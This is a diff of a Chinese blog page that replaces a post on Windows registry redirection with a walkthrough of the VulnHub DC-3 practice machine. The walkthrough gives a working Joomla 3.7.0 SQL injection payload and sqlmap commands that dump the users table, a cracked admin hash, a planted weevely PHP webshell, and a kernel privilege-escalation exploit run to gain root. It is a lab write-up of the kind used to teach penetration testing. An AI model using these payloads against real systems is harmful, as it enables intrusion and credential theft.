@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="注册表重定向, 域名之外">
-    <meta name="description" content="写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。">
+    <meta name="keywords" content="VulnHub仿真靶机渗透之DC-3 【DC系列】, 域名之外">
+    <meta name="description" content="这次渗透是DC系列（VulnHub的仿真靶机）的DC-3，包含了提权、传webshell等知识。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>注册表重定向 | 域名之外</title>
+    <title>VulnHub仿真靶机渗透之DC-3 【DC系列】 | 域名之外</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">注册表重定向</h1>
+                    <h1 class="description center-align post-title">VulnHub仿真靶机渗透之DC-3 【DC系列】</h1>
                 </div>
             </div>
         </div>
@@ -349,8 +349,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                <span class="chip bg-color">合规基线相关</span>
+                            <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">DC系列靶机</span>
                             </a>
                         
                     </div>
@@ -361,8 +361,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF/" class="post-category">
-                                合规基线
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                仿真靶机渗透
                             </a>
                         
                     </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-07-19
+                    2022-03-06
                 </div>
                 
 
@@ -395,45 +395,153 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。</p>
+                <p>这次渗透是DC系列（VulnHub的仿真靶机）的DC-3，包含了提权、传webshell等知识。</p>
 <span id="more"></span>
-<h1 id="重定向技术😊"><a href="#重定向技术😊" class="headerlink" title="重定向技术😊"></a>重定向技术😊</h1><h4 id="重定向技术适用版本："><a href="#重定向技术适用版本：" class="headerlink" title="重定向技术适用版本："></a>重定向技术适用版本：</h4><p>Windows XP X64、Windows Server 2003 X64及以后的X64版本。</p>
-<h4 id="重定向技术产生原因：为了确保32位程序能够顺利运行"><a href="#重定向技术产生原因：为了确保32位程序能够顺利运行" class="headerlink" title="重定向技术产生原因：为了确保32位程序能够顺利运行"></a>重定向技术产生原因：为了确保32位程序能够顺利运行</h4><p>为了将32位程序和64位程序分离开，产生了一种模拟器（WOW64，Windows 32 on Windows 64），WOW64 模拟器让我们可以在64位平台上运行32位程序，它在系统层中另外提供了一层，来支持老式的32位程序。</p>
-<h3 id="一：重定向-文件重定向"><a href="#一：重定向-文件重定向" class="headerlink" title="一：重定向-文件重定向"></a>一：重定向-文件重定向</h3><p>ps: 这种文件重定向对于每个32位应用程序默认打开的，但是也可以通过调用API关闭</p>
-<h4 id="文件重定向原因：为了确保32位程序能够顺利运行"><a href="#文件重定向原因：为了确保32位程序能够顺利运行" class="headerlink" title="文件重定向原因：为了确保32位程序能够顺利运行"></a>文件重定向原因：为了确保32位程序能够顺利运行</h4><p>windows对32位应用程序和64位应用程序有分开存放机制：</p>
-<p>对于64位，文件通常被放在%windir%\system32                和              %ProgramFiles%</p>
-<p>————-&gt;               C:\Windows\system32                           和                C:\program files。</p>
-<p>对于32位，文件通常被放在%windir%\syswow64                和              %ProgramFiles(x86)</p>
-<p>————-&gt;               C:\Windows\syswow64                          和              C:\program files (x86)。</p>
-<p>system32目录下都是64位的dll，只能支持64位程序使用，32位程序不能使用。而syswow64目录下都是32位的dll，可以支持32位程序使用。</p>
-<h4 id="文件重定向产生场景："><a href="#文件重定向产生场景：" class="headerlink" title="文件重定向产生场景："></a>文件重定向产生场景：</h4><p>32位程序访问%windir%\system32   或者  %ProgramFiles%   时候，会发生文件重定向。</p>
-<h4 id="文件重定向具体指向："><a href="#文件重定向具体指向：" class="headerlink" title="文件重定向具体指向："></a>文件重定向具体指向：</h4><p>%windir%\system32                      到                     %windir%\syswow64的重定向。</p>
-<p>%ProgramFiles%                           到                        C:\Program Files (x86)</p>
-<h4 id="文件重定向具体含义："><a href="#文件重定向具体含义：" class="headerlink" title="文件重定向具体含义："></a>文件重定向具体含义：</h4><p>32位应用程序去访问%windir%\system32，系统会自动跳转到%windir%\syswow64目录下面，syswow64目录下都是32位程序的dll，才能够让32位程序顺利加载【system32目录下面的64位dll不能让32位程序使用】。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719173156334.png" alt="image-20220719173156334"></p>
-<h3 id="二：重定向-注册表重定向"><a href="#二：重定向-注册表重定向" class="headerlink" title="二：重定向-注册表重定向"></a>二：重定向-注册表重定向</h3><p>64位Windows的注册表分为 32 位注册表项和 64 位注册表项，许多 32 位注册表项与其相应的 64 位注册表项同名。<br>64 位版本的注册表编辑器中，32 位注册表项显示在 <code>HKEY_LOCAL_MACHINE\Software\WOW6432Node</code> 注册表项下。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719175758828.png" alt="image-20220719175758828"></p>
-<p>打开64位注册表【运行-&gt;regedit】</p>
-<p>打开32位注册表【运行-&gt;%systemroot%\syswow64\regedit】</p>
-<h4 id="注册表重定向产生原因：防止注册表键冲突"><a href="#注册表重定向产生原因：防止注册表键冲突" class="headerlink" title="注册表重定向产生原因：防止注册表键冲突"></a>注册表重定向产生原因：防止注册表键冲突</h4><h4 id="注册表重定向实质：维护两套不同的注册表键【64位和32位】"><a href="#注册表重定向实质：维护两套不同的注册表键【64位和32位】" class="headerlink" title="注册表重定向实质：维护两套不同的注册表键【64位和32位】"></a>注册表重定向实质：维护两套不同的注册表键【64位和32位】</h4><p>ps：</p>
-<p><strong>注册表反射</strong>：【适用版本：windows xp、windows server2003等，从win7和winserver 2008 r2开始WOW64就不使用反射机制了，以前通过反射改的key都改为共享了】        维护两套不同的注册表重定向很多是通过：注册表反射机制完成的，但是不是所有的键值都会受到反射机制影响。</p>
-<p>​                      注册表反射是在64 位注册表视图和 32 位注册表视图之间<strong>复制</strong>某些特定的注册表项和项值。</p>
-<h4 id="注册表分类："><a href="#注册表分类：" class="headerlink" title="注册表分类："></a>注册表分类：</h4><p>1：专门给64位程序访问  【除了32位的都是】</p>
-<p>2：专门给32位程序访问  【HKEY_LOCAL_MACHINE\Software\WOW6432Node 路径下的】</p>
-<h4 id="注册表重定向具体举例："><a href="#注册表重定向具体举例：" class="headerlink" title="注册表重定向具体举例："></a>注册表重定向具体举例：</h4><p>应用程序操作注册表的时候32bit方式和64bit方式。运行于64bit系统下的32bit应用程序默认操作32位注册表项（即被重定向到WOW6432Node下的子项）；而64bit应用程序才是操作的直观子项。</p>
-<p>比如，同在64bit系统下，使用如下代码访问注册表：</p>
-<p>​    ::RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T(“Software\Sobey\MPC “), 0,KEY_ALL_ACCESS, &amp;hKey)</p>
-<p>​    如果应用程序为32位子系统，那么实际访问的注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Sobey\MPC；</p>
-<p>​    而如果应用程序为64位子系统，那么实际访问的注册表位置将会是：HKEY_LOCAL_MACHINE\SOFTWARE\Sobey\MPC。</p>
-<p>下面这个可以看到注册表具体项是哪个是反射、重定向还是共享，非常有用。</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winprog64/shared-registry-keys">WOW 下的重定向、共享和反射项 </a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719183751494.png" alt="image-20220719183751494"></p>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/view-system-registry-with-64-bit-windows">64位视图注册表</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/diaomo9737/article/details/101724390?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-101724390-blog-40922361.pc_relevant_multi_platform_whitelistv1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">Windows:32位程序运行在64位系统上注册表会重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangqin115/article/details/40922361">jiangqin115  - 注册表重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/mmthr/article/details/53932154">mmthr  -  32位程序访问64位  system32文件夹时注意事项</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crazy_liyang/article/details/68302170">Crzayliyang-架构Young，64位Windows系统注册表的 32 位注册表项和64 位注册表项</a></p>
+<h1 id="VulnHub靶机渗透之DC-3【DC系列】"><a href="#VulnHub靶机渗透之DC-3【DC系列】" class="headerlink" title="VulnHub靶机渗透之DC-3【DC系列】"></a>VulnHub靶机渗透之DC-3【DC系列】</h1><p>dc-3靶机下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a></p>
+<p>vmware workstation</p>
+<p>kali ：192.168.124.129</p>
+<h4 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h4><p>nmap扫描局域网发现dc-3的ip   —&gt;192.168.124.132</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.124.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646549445323.png" alt="1646549445323"></p>
+<h4 id="详细扫描"><a href="#详细扫描" class="headerlink" title="详细扫描"></a>详细扫描</h4><p>80端口开放，是个Joomla的cms，但扫描器【nmap、whatweb】和插件【wappalyzer】都没找到版本号。</p>
+<p>CMS：Joomla</p>
+<p>脚本：php  </p>
+<p>操作系统：Ubuntu</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.124.132   -p1-65535</span><br><span class="line">-p 指定端口</span><br><span class="line">-A 详细扫描</span><br><span class="line">-T 设置速度，0-5都可以</span><br></pre></td></tr></table></figure>
+
+<p>Nmap默认扫描前1000个端口,即1-1000。所以我们要指定端口从1到65535。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646549887424.png" alt="1646549887424"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553144361.png" alt="1646553144361"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646549768665.png" alt="1646549768665"></p>
+<p>常规思路是dirb扫一下目录，dirb目录扫描【dirb用的是默认字典common.txt】：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646550662841.png" alt="1646550662841"></p>
+<p>找到后台地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646550872672.png" alt="1646550872672"></p>
+<p>因为要查找Joomla版本号，所以用一下Joomla专门的扫描器  joomscan扫一下是否能找到。【Joomscan  (Joomla漏洞扫描程序)是一个用Perl编程语言编写的开源工具,可以检测和分析Joomla CMS漏洞。】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joomscan -u 192.168.124.132</span><br><span class="line">-u 指定url和域名</span><br></pre></td></tr></table></figure>
+
+<p>发现了版本  是3.7.0，还有管理员页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553255296.png" alt="1646553255296"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553279843.png" alt="1646553279843"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553315253.png" alt="1646553315253"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646554711665.png" alt="1646554711665"></p>
+<p>msf简单搜了一下，最新的利用模块都是2016之前的了，都用不了，版本没跟上。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646552288049.png" alt="1646552288049"></p>
+<p>所以在网上搜一下看看有没有可以直接用poc</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553752070.png" alt="1646553752070"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553777434.png" alt="1646553777434"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553800261.png" alt="1646553800261"></p>
+<p>poc使用复现成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.124.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646553991737.png" alt="1646553991737"></p>
+<p>确认存在SQL注入漏洞【CVE-2017-8917 SQL注入】</p>
+<p>在exploitdb中找到了Joomla 3.7.0的SQL注入漏洞可以利用。【exploit-db提供searchsploit利用files.csv进行搜索离线漏洞库文件的位置。】</p>
+<p>searchsploit joomla 3.7.0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646556910384.png" alt="1646556910384"></p>
+<p>然后查看利用方法，exploitdb默认路径是：&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646557373059.png" alt="1646557373059"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p>详细提供了SQL注入的方法。</p>
+<p>用上方提供的注入方法爆出了数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.124.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646557562488.png" alt="1646557562488"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646555022567.png" alt="1646555022567"></p>
+<p>指定数据库：joomadb，爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.124.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br><span class="line"># -D 指定数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646557652115.png" alt="1646557652115"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646556382127.png" alt="1646556382127"></p>
+<p>指定表:__users，爆字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.124.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb  -T &quot;#__users&quot; --columns -p list[fullordering]</span><br><span class="line"># -T 指定表</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646558423722.png" alt="1646558423722"></p>
+<p>按需求选择线程数字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646557878700.png" alt="1646557878700"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646558115795.png" alt="1646558115795"></p>
+<p>指定表:__users，爆字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.124.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb  -T &quot;#__users&quot; -C username,password --dump -p list[fullordering]</span><br><span class="line"># -C  指定要暴力拆解的字段</span><br><span class="line"># --dump 导出结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646558599279.png" alt="1646558599279"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646558586877.png" alt="1646558586877"></p>
+<p> admin    </p>
+<p>2y10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu </p>
+<p>看见password是hash的，不是md5也不是base64，用john爆破。</p>
+<p>用户名：admin  </p>
+<p>密码：  snoopy</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646559059162.png" alt="1646559059162"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646559044054.png" alt="1646559044054"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646559081451.png" alt="1646559081451"></p>
+<p>后台登录成功，然后寻找可以利用的上传点进行getshell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646559126398.png" alt="1646559126398"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646559619330.png" alt="1646559619330"></p>
+<p>使用后门生成工具 weevely</p>
+<p>【Weevely 是使用python编写的一个用来生成并管理php webshell的安全测试工具，相当于Linux中的php菜刀】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate &lt;连接密码&gt; &lt;path&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646560168934.png" alt="1646560168934"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646560347264.png" alt="1646560347264"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646562425876.png" alt="1646562425876"></p>
+<p>protostar模板是默认的，所以我们在protostar里面床架一个shell.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646562548362.png" alt="1646562548362"></p>
+<p>shell代码粘贴到这里，保存成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646562663406.png" alt="1646562663406"></p>
+<p>进行后门连接成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely http://192.168.124.132/templates/protostar/html/shell.php passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646563176678.png" alt="1646563176678"></p>
+<h3 id="后门连接进行信息收集"><a href="#后门连接进行信息收集" class="headerlink" title="后门连接进行信息收集"></a>后门连接进行信息收集</h3><h4 id="查看内核版本信息"><a href="#查看内核版本信息" class="headerlink" title="查看内核版本信息"></a>查看内核版本信息</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646564636261.png" alt="1646564636261"></p>
+<p>使用命令查看内核版本【linux 4.4.0-21】、cpu架构【i686】，发行版【ubuntu 16.04】</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">uname -a</span><br><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
+
+<p>发现操作系统发型版ubuntu版本是16.04的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646563535380.png" alt="1646563535380"></p>
+<h4 id="进行提权"><a href="#进行提权" class="headerlink" title="进行提权"></a>进行提权</h4><p>exploit-db搜索漏洞  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04 priv </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646564803267.png" alt="1646564803267"></p>
+<p>这个内核版本符合信息搜集到的4.4.0-21</p>
+<p>Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation                                             | linux&#x2F;local&#x2F;39772.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646565185945.png" alt="1646565185945"></p>
+<p>最后一行发现exp下载地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646565219898.png" alt="1646565219898"></p>
+<p>我kali节点有点问题【wget失败了】，用的本机windows下载的，通过xftp传过去的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646566124754.png" alt="1646566124754"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646566013908.png" alt="1646566013908"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646566488702.png" alt="1646566488702"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646567103174.png" alt="1646567103174"></p>
+<p>通过weevely的文件上传功能传过去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_upload /home/kali/Desktop/39772.zip shell.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646567552646.png" alt="1646567552646"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646567775868.png" alt="1646567775868"></p>
+<p>失败了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646568016462.png" alt="1646568016462"></p>
+<p>没有执行权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646568088761.png" alt="1646568088761"></p>
+<p>解压：unzip 39773.zip  #解压39772.zip文件</p>
+<p>再解压：tar -xvf exploit.tar  #解压exploit提权脚本tar包</p>
+<p>切换：cd ebpf_mapfd_doubleput_exploit&#x2F; </p>
+<p>执行： .&#x2F;compile.sh   #执行脚本，编译文件</p>
+<p>​            .&#x2F;doubleput  #执行提权文件</p>
+<p>然后得到了root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646568439784.png" alt="1646568439784"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646568467425.png" alt="1646568467425"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>​    1，分析web应用信息（平台，版本等）</p>
+<p>​    2，利用exploitdb进行查询，简化漏洞挖掘过程。</p>
+<p>​    3，破解密码登录后台，上传webshell。</p>
+<p>​    4，寻找适用的漏洞进行提权。</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>Vulnhub DC-3        【<strong>Nurburgring</strong>】        </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43583637/article/details/101554815">https://blog.csdn.net/weixin_43583637/article/details/101554815</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/105403927">https://blog.csdn.net/qq_32393893/article/details/105403927</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1472181">https://cloud.tencent.com/developer/article/1472181</a></p>
 
                 
             </div>
@@ -460,7 +568,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/">http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/</a>
+                    <a href="http://highgerms.github.io/2022/03/06/DC3/">http://highgerms.github.io/2022/03/06/DC3/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -498,8 +606,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                    <span class="chip bg-color">合规基线相关</span>
+                                <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">DC系列靶机</span>
                                 </a>
                             
                         </div>
@@ -549,31 +657,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/07/25/WIN+R%20%20%E5%AE%9E%E7%94%A8%E5%A4%A7%E6%80%BB%E7%BB%93/">
+                <a href="/2022/03/08/dc-4/">
                     <div class="card-image">
                         
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-4 【DC系列】">
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="WIN+R实用大总结">
-                        
-                        <span class="card-title">WIN+R实用大总结</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-4 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            将Windows的各种快捷键记熟会提高效率，我们cmd命令都运行结束了，有些傻孩子都还在找图形化界面入口。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-4，包含了nc反弹shell、hydra爆破ssh 、teehee权限提升等知识。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-08
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/" class="post-category">
-                                    效率提升技巧
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    仿真靶机渗透
                                 </a>
                             
                             
@@ -583,8 +690,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/">
-                        <span class="chip bg-color">效率提升技巧</span>
+                    <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">DC系列靶机</span>
                     </a>
                     
                 </div>
@@ -598,23 +705,23 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/dc-8/">
+                <a href="/2022/03/05/DC2/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-8 【DC系列】">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-2 【DC系列】">
                         
-                        <span class="card-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-2 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-2，包含了wordpress框架漏洞、vi绕过rbash和git提权等知识。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-05
                             </span>
                         <span class="publish-author">
                             
